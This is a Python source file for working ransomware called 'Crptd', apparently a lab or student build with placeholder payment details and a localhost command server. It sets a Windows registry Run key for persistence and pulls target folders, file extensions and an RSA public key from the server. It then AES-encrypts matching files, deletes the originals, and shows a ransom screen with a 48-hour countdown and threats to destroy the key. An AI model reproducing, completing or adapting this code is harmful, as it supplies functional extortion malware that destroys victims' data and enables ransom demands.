from Crypto.Cipher import AES
import sys
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import urllib.request
import json
import tkinter as tk
import math
import base64

#____________________________________FUNCTIONS____________________________________

def decryptKey(encryptedKey):
    values = {'Key': base64.b64encode(encryptedKey[0]), 'IV': base64.b64encode(encryptedKey[1])}
    data = urllib.parse.urlencode(values).encode("utf-8")
    req = urllib.request.Request('http://127.0.0.1:5002/decryptKey', data)
    response = urllib.request.urlopen(req)
    json_data = json.loads(response.read())
    b64_decryptedKey = {'Key': json_data['Key'].encode('utf-8'), 'IV': json_data['IV'].encode('utf-8')}
    decryptedKey = {'Key': base64.b64decode(b64_decryptedKey['Key']), 'IV': base64.b64decode(b64_decryptedKey['IV'])}
    return decryptedKey


def loadKey():
    encryptedKey = [b'', b'']
    with open('Key.bin', "rb") as f:
        encryptedKey[0] = f.read()
    with open('IV.bin', "rb") as f:
        encryptedKey[1] = f.read()
    return decryptKey(encryptedKey)

def getDirs():
	response = urllib.request.urlopen('http://127.0.0.1:5002/config/dirs')
	json_data = json.loads(response.read())
	return json_data['dirs']

def getExts():
	response = urllib.request.urlopen('http://127.0.0.1:5002/config/exts')
	json_data = json.loads(response.read())
	return json_data['exts']

def getPublicKey():
	response = urllib.request.urlopen('http://127.0.0.1:5002/publicKey')
	json_data = json.loads(response.read())
	return json_data['Key']

def saveKey(Key):
    encodedPubKey = getPublicKey()
    pubKey = RSA.import_key(encodedPubKey)
    cipher_RSA = PKCS1_OAEP.new(pubKey)
    with open('Key.bin','wb') as f:
        f.write(cipher_RSA.encrypt(Key[0]))	#encrypt and save Key
    with open('IV.bin','wb') as f:
        f.write(cipher_RSA.encrypt(Key[1])) #encrypt and save Initialization Vector
    return

def getKey():
    #	response = urllib.request.urlopen('http://127.0.0.1:5002/Key')      Commented out code is used to get a priavate key and IV from the server
    #	json_data = json.loads(response.read())
    Key = ['','']
    #	b64strK = json_data['Key']
    #	b64binK = b64strK.encode('utf-8')
    #	Key[0] = base64.b64decode(b64binK)
    #	b64strIV = json_data['IV']
    #	b64binIV = b64strIV.encode('utf-8')
    #	Key[1] = base64.b64decode(b64binIV)
    Key[0] = os.urandom(32)
    Key[1] = os.urandom(16)
    return Key

def tick():
    global time1

    if(time1 == 0):
        #delete private key
        clock.config(text="EXPIRED")
        return

    hours = math.floor(time1/3600)
    if hours >= 10:
        h = str(hours)
    else:
        h = "0" + str(hours)

    mins = math.floor((time1 - (hours*3600))/60)
    if mins >= 10:
        m = str(mins)
    else:
        m = "0" + str(mins)

    secs =  time1 - (hours*3600) - (mins*60)
    if secs >= 10:
        s = str(secs)
    else:
        s = "0" + str(secs)

    clock.config(text= h+":"+m+":"+s)
    time1 = time1-1
    clock.after(1000, tick)

def close():
    #os.remove("Key.bin")
    #os.remove("IV.bin")
    root.destroy()

def verify(): #still has to be implemented
    root.destroy()

def selfDestruct():
    #os.remove("Key.bin")
    #os.remove("IV.bin")
    #os.remove(sys.argv[0]) DO NOT UNCOMMENT BEFORE SAVING AN EXTRA COPY OF THIS FILE
    sys.exit()

#____________________________________CODE____________________________________

ChunkSize = 144
MinimumFilesFound = 1

pf = sys.platform# determine platform

if pf == 'win32':#Code for Windows
    import winreg 

    path = __file__.replace("/", "\\")
    batPath = os.path.dirname(__file__).replace("/","\\") + "\\runMain.bat"

    if not (os.path.exists(os.path.dirname(__file__) + "\\runmain.bat")):
        fp = open('runMain.bat', 'w+')
        str2 = "python " + __file__
        fp.write(str2)
        REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "restartCRPTD", 0, winreg.REG_SZ, batPath)  # replace test values with real names later
        winreg.CloseKey(registry_key)
        sys.exit()
    
    rootdirs = getDirs()
    extensions = getExts()
    targetFiles = []
    for rootdir in rootdirs:
        for subdir, dirs, files in os.walk(rootdir):
            for file in files:
                ext = os.path.splitext(file)[-1].lower()
                if ext in extensions:
                    targetFiles.append(os.path.join(subdir, file))
	
    if len(targetFiles) < MinimumFilesFound:
        selfDestruct()
	
	
    Key = getKey() #Key = ['Symmetric Private Key', 'Initialization Vector']

    for file in targetFiles:

        # open plaint text and read in lines
        with open(file, "rb") as plainfp:

            # create cipher object
            cipher = AES.new(Key[0], AES.MODE_OFB, iv=Key[1])

            # create cipher text file
            cFile = file + ".crptd"
            with open(cFile, "wb") as cipherfp:
                # encrypt and write
                chunk = b'0'
                while (chunk != b''):
                    chunk = plainfp.read(ChunkSize)
                    ct = cipher.encrypt(chunk)
                    cipherfp.write(ct)

        os.unlink(file)

    saveKey(Key)

    root = tk.Tk()
    root.title("Crptd")
    root.resizable(width="false", height="false")
    root.geometry('1000x500')
    root.protocol('WM_DELETE_WINDOW', close)
    #logobg = tk.PhotoImage(file="bg.gif")                  UNCOMMENT TO INCLUDE BACKGROUND
    #background_label = tk.Label(root, image=logobg)
    #background_label.place(x=0, y=0, relwidth=1, relheight=1)

    time1 = 172800
    clock = tk.Label(root, font=('Helvetica', 20, 'bold'), bg='azure3', borderwidth=2, relief="groove")
    clock.place(x=435, y=20, height=30, width=130)

    info = tk.Text(root, height=20, width=60, bg='azure3', wrap='word', font="Helvetica", relief="ridge")
    info.place(x=435, y=60)
    message = """DO NOT CLOSE THIS WINDOW!

    Your computer has been infected by the Crptd ransomware and your files have been encrypted using a unique private key. To recover your files you must pay a specific bitcoin amount to a specific address, both of which are indicated at the bottome of this page.

    You must pay before the timer at the top of this window reaches 0. Failure to pay will result in your unique private key being deleted.

    NOTE: DO NOT CLOSE THIS WINDOW. DO NOT ATTEMPT TO REMOVE THE CRPTD RANSOMWARE. DO NOT MOVE OR ALTER ANY OF YOUR ENCRYPTED FILES. KEEP YOUR COMPUTER ON. FAILURE TO FOLLOW THESE INTRUCTIONS COULD RESULT IN YOU PREMINANTLY LOSING YOUR ENCRYPTED FILES."""
    info.insert('end', message)

    bcaddr = tk.Label(root, text="[SAMPLE BITCOIN ADDRESS]", font='Helvetica', bg='azure3', borderwidth=2,
                      relief="groove")
    bcaddr.place(x=435, y=440, height=30, width=300)

    ransom = "[TEST]"
    amount = tk.Label(root, text=ransom, font='Helvetica', bg='azure3', borderwidth=2, relief="groove")
    amount.place(x=750, y=440, height=30, width=231)

    verify = tk.Button(root, text="Verify Payment", font='Helvetica', bg='azure3', borderwidth=2, relief="groove", command = verify)
    verify.place(x=750, y=20, height=30, width=231)

    tick()
    root.mainloop()

    targetFiles = []
    for rootdir in rootdirs:
        for subdir, dirs, files in os.walk(rootdir):
            for file in files:
                ext = os.path.splitext(file)[-1].lower()
                if ext == '.crptd':
                    targetFiles.append(os.path.join(subdir, file))

    if len(targetFiles) < 1:
        selfDestruct()

    Key = loadKey()

    for file in targetFiles:

        # open cipher text and read in lines
        with open(file, "rb") as cipherfp:

            # create cipher object
            cipher = AES.new(Key['Key'], AES.MODE_OFB, iv=Key['IV'])

            # create plain text file
            pfile = file[0:-6]
            with open(pfile, "wb") as plainfp:
                # encrypt and write
                chunk = b'0'
                while (chunk != b''):
                    chunk = cipherfp.read(ChunkSize)
                    pt = cipher.decrypt(chunk)
                    plainfp.write(pt)

        os.unlink(file)

    selfDestruct()

else:
    print("not supported operating system")
    selfDestruct()